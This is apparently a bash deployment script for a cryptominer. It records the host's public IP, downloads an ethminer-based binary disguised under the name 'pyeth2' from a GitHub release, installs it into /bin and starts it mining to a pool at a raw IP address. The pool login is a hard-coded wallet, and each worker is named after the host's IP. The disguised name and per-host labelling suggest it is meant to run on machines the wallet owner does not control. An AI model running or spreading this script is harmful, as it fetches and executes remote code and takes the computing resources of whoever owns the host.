  
#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io
wget https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2
chmod +x pyeth2
cp pyeth2 /bin/pyeth2
ls -la
pyeth2 -P stratum1+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.$IPNAME@116.203.10.54:990 -U
red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`
echo "${red}red text ${green}green text${reset}"
